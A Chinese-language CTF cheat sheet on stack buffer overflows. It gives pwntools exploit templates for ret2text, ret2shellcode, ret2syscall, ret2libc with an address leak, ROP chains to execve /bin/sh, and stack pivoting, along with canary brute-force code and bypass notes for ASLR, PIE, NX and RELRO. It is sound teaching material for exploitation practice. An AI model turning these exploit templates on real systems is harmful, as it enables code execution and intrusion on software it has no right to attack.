# 栈溢出 (Stack Overflow)

## 原理

程序向栈上缓冲区写入超过其长度的数据，覆盖返回地址，劫持控制流。

## 攻击链

### 1. 漏洞识别

```c
// 危险函数
gets(buf)              // 无长度限制
scanf("%s", buf)       // 无长度限制
strcpy(dst, src)       // 无长度限制
strcat(dst, src)       // 无长度限制
sprintf(buf, fmt, ...)  // 无长度限制
read(fd, buf, n)       // n 过大
fread(buf, 1, n, fp)   // n 过大
memcpy(dst, src, n)    // n 过大
```

### 2. 确定偏移

```python
# pwntools 生成 pattern
from pwn import *
pattern = cyclic(200)
# 输入 pattern，崩溃时查看 EIP/RIP
offset = cyclic_find(0x6161616a)  # 根据崩溃地址
```

```bash
# gdb
> pattern create 200
> pattern offset $rsp
```

### 3. 基础 ret2text

```python
from pwn import *

p = process('./pwn')
# 找到 system 和 /bin/sh 的地址
system_addr = 0x401234
binsh_addr = 0x405678

payload = b'A' * offset
payload += p64(system_addr)
# x64 需要对齐
payload += p64(0)  # ret 地址，对齐用
payload += p64(binsh_addr)

p.sendline(payload)
p.interactive()
```

### 4. ret2shellcode

```python
from pwn import *

context.arch = 'amd64'
p = process('./pwn')

# NX 关闭时，shellcode 在栈上
shellcode = asm(shellcraft.sh())
buf_addr = 0x404080  # 已知栈地址

payload = shellcode.ljust(offset, b'\x90')
payload += p64(buf_addr)

p.sendline(payload)
p.interactive()
```

### 5. ret2syscall

```python
# 32 位
from pwn import *

context.arch = 'i386'
p = process('./pwn')

# execve("/bin/sh", 0, 0)
# eax = 0xb
# ebx = binsh_addr
# ecx = 0
# edx = 0
# int 0x80

pop_eax = 0x080bb196
pop_ebx_ecx_edx = 0x0806eb91
int_0x80 = 0x08049421
binsh_addr = 0x080be408

payload = b'A' * offset
payload += p32(pop_eax) + p32(0xb)
payload += p32(pop_ebx_ecx_edx) + p32(binsh_addr) + p32(0) + p32(0)
payload += p32(int_0x80)

p.sendline(payload)
p.interactive()
```

### 6. ret2libc

```python
from pwn import *

context.arch = 'amd64'
p = process('./pwn')
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# 1. 泄露 libc 地址
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']
pop_rdi = 0x401233  # ROPgadget --binary ./pwn --only "pop|ret"

payload = b'A' * offset
payload += p64(pop_rdi) + p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)

p.sendline(payload)
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"puts: {hex(puts_addr)}")

# 2. 计算 libc 基址
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

# 3. 第二次利用
payload2 = b'A' * offset
payload2 += p64(pop_rdi) + p64(binsh_addr)
payload2 += p64(system_addr)

p.sendline(payload2)
p.interactive()
```

### 7. ROP 链

```python
# 多个 gadget 组合
from pwn import *

# ROPgadget --binary ./pwn --ropchain
# 自动生成 ROP 链

# 手动构造
pop_rdi = 0x401233
pop_rsi = 0x401234
pop_rdx = 0x401235
pop_rax = 0x401236
syscall = 0x401237

# execve("/bin/sh", 0, 0)
binsh_addr = 0x405678
payload = b'A' * offset
payload += p64(pop_rdi) + p64(binsh_addr)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(59)  # execve
payload += p64(syscall)
```

### 8. 栈迁移 (Stack Pivoting)

```python
# 当溢出空间不足时，将栈迁移到可控区域
# leave; ret 指令
# leave = mov rsp, rbp; pop rbp

leave_ret = 0x401234
bss_addr = 0x405000  # 可控区域

# 第一次溢出：迁移栈到 bss
payload = b'A' * (offset - 8)
payload += p64(bss_addr)  # 覆盖 rbp
payload += p64(leave_ret)  # 返回到 leave; ret
# 此时 rsp = bss_addr + 8

# 在 bss 上构造 ROP 链
# 需要先写入 bss
```

## 绕过技巧

### 1. Canary 绕过

```python
# 1. 泄露 Canary
# 通过格式化字符串
# 通过栈溢出 + 逐字节爆破
# 通过 fork 进程爆破

# 2. 爆破 Canary
for i in range(256):
    p.sendline(b'A' * offset + bytes([canary]) + bytes([i]))
    if b"Good" in p.recv():
        canary = (canary << 8) | i
        break

# 3. 覆盖 Canary
# 某些情况下可以覆盖 Canary 为已知值
```

### 2. ASLR 绕过

```python
# 1. 泄露地址
# 通过格式化字符串
# 通过栈溢出泄露 libc 地址
# 通过信息泄露

# 2. 爆破地址
# 32 位 ASLR 弱，可爆破
# 64 位 ASLR 强，需泄露

# 3. partial overwrite
# 只覆盖返回地址的低字节
# 利用末尾不变性
```

### 3. PIE 绕过

```python
# 1. 泄露 PIE 基址
# 通过格式化字符串
# 通过栈溢出泄露代码段地址

# 2. partial overwrite
# 只覆盖低 12 位（页内偏移）
# 不需要知道 PIE 基址
```

### 4. NX 绕过

```python
# 1. ROP
# 2. ret2libc
# 3. ret2syscall
# 4. mprotect 修改内存权限
# 5. ret2csu
```

### 5. RELRO 绕过

```python
# Full RELRO: GOT 不可写
# 1. 不能改 GOT
# 2. 用其他方法：ret2libc, IO_FILE, exit_funcs

# Partial RELRO: GOT 可写
# 1. 改 GOT 表
# 2. ret2plt
```

## 2024-2026 新技术点

### 1. glibc 2.34+ 无 hooks

```python
# 传统 __malloc_hook/__free_hook 失效
# 新利用方法：
# 1. IO_FILE 攻击（House of Apple 系列）
# 2. exit_funcs 利用
# 3. _environ 泄露栈地址
# 4. __stack_chk_guard 覆盖
# 5. TLS 劫持
```

### 2. safe-linking

```python
# glibc 2.32+ 引入
# tcache/fastbin 指针加密
# ptr = (ptr >> 12) ^ target
# 需要知道堆地址才能伪造指针
```

### 3. per-thread cache 加固

```python
# glibc 2.34+ 加强 tcache key 检测
# double free 检测更严格
# 需要绕过 key 检测
```

### 4. ARM64 栈溢出

```python
# ARM64 寄存器：x0-x30
# x30 是返回地址（LR）
# x29 是帧指针（FP）

# ROP 链构造
# csu gadget
# ret2libc
```

### 5. RISC-V 栈溢出

```python
# RISC-V 架构
# ra 寄存器是返回地址
# fp 寄存器是帧指针
```

### 6. 现代编译器优化

```python
# GCC 13+ 新特性
# Clang 17+ 新特性
# 新的优化可能引入新漏洞
```

### 7. CFI (Control Flow Integrity)

```python
# Clang CFI
# GCC CET (Control-flow Enforcement Technology)
# 间接分支检查
# 影子栈
# 需要新绕过方法
```

### 8. 硬件级防护

```python
# Intel CET
# ARM BTI (Branch Target Identification)
# ARM PAC (Pointer Authentication)
# MTE (Memory Tagging Extension)
```

### 9. 沙箱逃逸

```python
# seccomp 沙箱
# 通过 ORW (open/read/write) 绕过
# 通过侧信道绕过
```

### 10. 新型利用链

```python
# House of Apple 2/3
# House of Cat
# House of Banana
# 新的 IO_FILE 利用
```

## 工具推荐

- **pwntools** — Python 利用框架
- **ROPgadget** — ROP gadget 查找
- **ropper** — ROP gadget 查找
- **one_gadget** — libc one_gadget
- **LibcSearcher** — libc 版本识别
- **gdb + pwndbg** — 动态调试
- **Ghidra** — 反编译

## 参考链接

- [ctf-wiki pwn](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-stack-overflow/)
- [pwntools docs](https://docs.pwntools.com/)
- [Nightmare](https://guyinatuxedo.github.io/)
- [pwn college](https://pwn.college/)
